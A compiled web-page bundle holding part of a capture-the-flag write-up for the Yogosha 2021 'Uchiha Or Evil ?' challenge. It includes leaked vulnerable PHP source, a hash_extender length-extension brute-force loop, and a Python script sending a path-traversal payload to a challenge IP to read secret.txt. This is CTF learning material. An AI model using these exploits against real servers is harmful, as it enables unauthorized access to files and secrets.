import{S as Un,i as Sn,s as Pn,W as lo,w as b,x as C,y as A,Z as jn,_ as $n,f as I,t as O,z as x,$ as bn,k as o,q as t,a as r,T as Rs,l as n,m as p,r as l,h as a,c as F,U as Zs,n as i,b as h,D as s,E as Nn}from"../../../../chunks/index-9671d79c.js";import{P as Wn}from"../../../../chunks/post_layout-76c250d8.js";import{I as U}from"../../../../chunks/post_card-ea1dea7e.js";function Yn(Ts){let D,v,R,M,y,m,Us,ca,ia,ha,Bs,An=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?</span></div></code></div></pre>`,Ms,k,zs,Ss,xa,hs,La,Gs,f,Ta,Vs,Ua,Sa,Ks,Pa,ja,Js,Na,Wa,Ds,Ya,ys,Qa,Xs,S,Ha,se,qa,Ra,ee,Za,Ba,ds,Ma,Es,ae,za,Ga,fs,te,Va,Ka,le,Ja,Da,Ps,us,ya,z,G,Xa,oe,st,et,vs,at,ne,tt,da,pe,In=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_SERVER</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">HTTP_USER_AGENT</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]!==</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Uchiha</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)&#123;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">echo</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Access Denied. Only Uchiha clan can access this</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">else</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'><span style="color: #89DDFF">include</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">secret.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">string</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))&#123;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">arr</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">explode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">|</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,$</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">string</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">filenames</span><span style="color: #89DDFF">=$</span><span style="color: #EEFFFF">arr</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">];</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">hash</span><span style="color: #89DDFF">=$</span><span style="color: #EEFFFF">arr</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">];</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">if</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">hash</span><span style="color: #89DDFF">===</span><span style="color: #82AAFF">hash</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">sha256</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">SECRET</span><span style="color: #89DDFF">.</span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">filenames </span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&&</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">preg_match</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"/</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">/"</span><span style="color: #89DDFF">,$</span><span style="color: #EEFFFF">filenames</span><span style="color: #89DDFF">)===</span><span style="color: #F78C6C">0</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">)&#123;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">foreach</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">explode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">:</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,$</span><span style="color: #EEFFFF">filenames</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">filename</span><span style="color: #89DDFF">)&#123;</span></div><div class='line'><span style="color: #EEFFFF">   </span><span style="color: #89DDFF">if</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">in_array</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">filename</span><span style="color: #89DDFF">,[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">read.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">index.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">guinjutsu.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">jutsu</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">file_get_contents</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">filename</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">echo</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Sharingan: </span><span style="color: #89DDFF">".</span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">jutsu</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #82AAFF">echo</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Verification Failed! You didn't awaken your sharingan!</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div></code></div></pre>`,re,$,Z,lt,V,ot,nt,Fe,pt,rt,Ft,P,ct,ce,it,ht,K,Dt,yt,B,ie,J,dt,Et,he,X,ft,ut,De,ss,vt,mt,js,gt,es,_t,wt,g,kt,ye,$t,bt,de,Ct,At,Ee,It,Ot,fe,xt,Lt,Ea,ue,On=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/bin/bash</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> i </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$(</span><span style="color: #C3E88D">seq 100</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #89DDFF">do</span></div><div class='line'><span style="color: #EEFFFF">    hash_extender --data </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">read.php</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> --secret </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">i --append </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">:index.php:guinjutsu.php</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> --signature 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 --format sha256 --out-data-format=html </span><span style="color: #89DDFF">|</span><span style="color: #EEFFFF"> grep </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">New</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">|</span><span style="color: #EEFFFF"> cut -d </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D"> </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> -f3 </span><span style="color: #89DDFF">|</span><span style="color: #EEFFFF"> sed </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">:a;N;$!ba;s/&#92;n/|/g</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&gt;&gt;</span><span style="color: #EEFFFF"> hashes</span></div><div class='line'><span style="color: #89DDFF">done</span></div></code></div></pre>`,ve,j,ms,Tt,me,Ut,St,Pt,N,jt,ge,Nt,Wt,_e,Yt,Qt,gs,Ht,we,qt,fa,ke,xn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'><span style="color: #546E7A">// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus</span></div><div class='line'><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">check</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">)&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">par</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">parse_url</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(((</span><span style="color: #82AAFF">strpos</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">par</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">scheme</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">],</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)!==false)and($</span><span style="color: #EEFFFF">par</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">host</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]==</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">uchiha.fuinjutsukeeper.tech</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">))and($</span><span style="color: #EEFFFF">par</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">port</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]==</span><span style="color: #F78C6C">5000</span><span style="color: #89DDFF">))&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">False;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">((</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">api</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))and(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">endpoint</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])))&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">=$</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">api</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #89DDFF">.</span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">_POST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">endpoint</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">];</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">check</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">))&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">opts </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">=&gt;</span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">method</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">=&gt;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">follow_location</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">=&gt;false,</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">header</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">=&gt;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Accept-language: en</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">  </span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">context </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">stream_context_create</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">opts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">file_get_contents</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">false,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">context</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #82AAFF">echo</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div></code></div></pre>`,$e,u,be,L,Rt,Ce,Zt,Bt,Ae,Mt,zt,Ie,Gt,Vt,Kt,Oe,d,Jt,xe,Xt,sl,Le,el,al,Te,tl,ll,Ue,ol,nl,Se,pl,rl,Pe,Fl,cl,je,il,hl,Dl,Ne,as,yl,We,dl,El,_s,fl,Ye,ts,ul,Qe,vl,ml,ws,gl,He,ks,_l,qe,wl,kl,ua,Re,Ln=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">context </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">stream_context_create</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">opts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">file_get_contents</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">false,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">context</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #82AAFF">echo</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,Ze,W,Be,_,$l,Me,bl,Cl,ze,Al,Il,Ge,Ol,xl,ls,Ll,Tl,Ul,Ve,os,Sl,Ke,Pl,jl,$s,Nl,Je,Xe,Wl,va,sa,Tn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> requests </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> post</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> re </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> findall</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://3.141.159.106/</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">headers </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">User-Agent</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Uchiha</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">1</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">api</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">shttp://uchiha.fuinjutsukeeper.tech:5000/</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">endpoint</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">../../../../../../../../../../secret.txt</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url </span><span style="color: #89DDFF">+</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/guinjutsu.php</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">headers</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">headers</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #546E7A">#print(r.text)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">findall</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Yogosha&#123;.*</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">)[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">])</span></div></code></div></pre>`,ea,ns,bs,Yl,ps,Ql,Hl,ql,w,aa,Rl,Zl,ta,Bl,Ml,la,zl,Gl,oa,Vl,Kl,Cs,ma,As,Ns,Jl,ga,Ws,Is,Xl,rs,so,eo,_a;return hs=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/1.png"}}),Ds=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/2.png"}}),ys=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/3.png"}}),ds=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/4.png"}}),us=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/5.png"}}),vs=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/6.png"}}),gs=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/7.png"}}),_s=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/8.png"}}),ws=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/9.png"}}),$s=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/10.png"}}),Cs=new U({props:{src:"https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/11.png"}}),{c(){D=o("h1"),v=o("a"),R=t("Uchiha Or Evil ?"),M=r(),y=o("blockquote"),m=o("p"),Us=t("Yogosha Christmas CTF 2021"),ca=r(),ia=o("hr"),ha=r(),Bs=new Rs(!1),Ms=r(),k=o("ul"),zs=o("li"),Ss=o("p"),xa=t(`From the previous challenge we got a url. Let’s visit the page.
`),b(hs.$$.fragment),La=r(),Gs=o("li"),f=o("p"),Ta=t("Nothing much on this page. I ran "),Vs=o("code"),Ua=t("nikto"),Sa=t(" & got there is a "),Ks=o("code"),Pa=t("robots.txt"),ja=t(" file here. We can check the robots.txt page & there’s some interesting info. So there is page.Let’s go to "),Js=o("code"),Na=t("read.php"),Wa=r(),b(Ds.$$.fragment),Ya=r(),b(ys.$$.fragment),Qa=r(),Xs=o("li"),S=o("p"),Ha=t("We got access denied. There is an interesting line in the robots.txt file which is "),se=o("code"),qa=t("User-agent: Uchiha"),Ra=t(". Let’s change our useragent to "),ee=o("code"),Za=t("Uchiha"),Ba=t(`. You can use burp or a user agent changer extension. And we have something here.
`),b(ds.$$.fragment),Ma=r(),Es=o("li"),ae=o("p"),za=t("Let’s view the source. We have 2 things here."),Ga=r(),fs=o("ol"),te=o("li"),Va=t("The form is sending post data with some hash concatenated a filename"),Ka=r(),le=o("li"),Ja=t("Some dev notes(comments)"),Da=r(),Ps=o("p"),b(us.$$.fragment),ya=r(),z=o("ul"),G=o("li"),Xa=t("If we send the form we can see some odd thing happening here. Looks like the source code of the "),oe=o("code"),st=t("read.php"),et=t(` page is loading. So form the dev comment we can see we have to read the source here in-order to continue from here.
`),b(vs.$$.fragment),at=r(),ne=o("li"),tt=t("Let’s save the source in a file & read the code."),da=r(),pe=new Rs(!1),re=r(),$=o("ul"),Z=o("li"),lt=t("So this program is using the "),V=o("a"),ot=t("explode"),nt=t(" function to split the array into 2 parts. Hash and the file.Then it’s checking the hash with a concatenating the filename with a secret & from the array we can see there are 3 files. We cannot lord any other file from here. Then it’s just dumping the contents of the files we supplied using the delimiter "),Fe=o("code"),pt=t(":"),rt=t(" to split filenames."),Ft=r(),P=o("li"),ct=t("I stuck here for 2 days trying to get the secret. I even tried to bruteforce the secret. But the organizers told me it’s not brute forcible. There are some attacks on hash but the hash is "),ce=o("code"),it=t("sha256"),ht=t(" with is one of the safest (at the time being. Everything is secure untill someone breaks it ;). Cutting short the ans is "),K=o("a"),Dt=t("Length extension attack"),yt=t(". These are the article and videos that helped me."),B=o("ul"),ie=o("li"),J=o("a"),dt=t("https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack"),Et=r(),he=o("li"),X=o("a"),ft=t("https://www.youtube.com/watch?v=sMla6_4Z-CQ"),ut=r(),De=o("li"),ss=o("a"),vt=t("https://www.youtube.com/watch?v=6QQ4kgDWQ9w"),mt=r(),js=o("li"),gt=t("It’s a complicated attack so I left it to the smart people and used this tool "),es=o("a"),_t=t("hash_extender"),wt=r(),g=o("li"),kt=t("Here is the syntax "),ye=o("code"),$t=t("hash_extender --data data --secret len-of-sec --append append --signature hash --format fomrat"),bt=t(". We know the data "),de=o("code"),Ct=t("read.php"),At=t(", signature "),Ee=o("code"),It=t("184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5"),Ot=t(", format "),fe=o("code"),xt=t("sha256"),Lt=t(" we want the length of the secret. We can bruteforce it like this to generate signatures."),Ea=r(),ue=new Rs(!1),ve=r(),j=o("ul"),ms=o("li"),Tt=t("This script will generate a file called "),me=o("code"),Ut=t("hashes"),St=t(" concatenating the hashes. Then we can use burpsuite or python to send the hash & check the result."),Pt=r(),N=o("li"),jt=t("The correct length is "),ge=o("code"),Nt=t("42"),Wt=t(". And we can see the result here we have the source of "),_e=o("code"),Yt=t("guinjutsu.php"),Qt=r(),b(gs.$$.fragment),Ht=r(),we=o("li"),qt=t("So we have another source code let’s see this one in more details"),fa=r(),ke=new Rs(!1),$e=r(),u=o("ul"),be=o("li"),L=o("p"),Rt=t("In short the "),Ce=o("code"),Zt=t("check"),Bt=t(" function is checking for the a url which looks like this "),Ae=o("code"),Mt=t("http://uchiha.fuinjutsukeeper.tech:5000/"),zt=t(". If the check passes then it’ll concat the endpoint with the url & give the output of whatever we’re supplying. So how can we exploit this we have to load something which is on the "),Ie=o("code"),Gt=t("http://uchiha.fuinjutsukeeper.tech:5000/"),Vt=t(" & we can’t load anything else or can we…"),Kt=r(),Oe=o("li"),d=o("p"),Jt=t("It took me an another day (:-` yah I’m slow). Php is weird we all know.. This part "),xe=o("code"),Xt=t("strpos($par['scheme'],'http')!==false)"),sl=t(" only checks for if the "),Le=o("code"),el=t("http"),al=t(" part is supplied in the url or not; i.e. "),Te=o("code"),tl=t("http"),ll=t(", 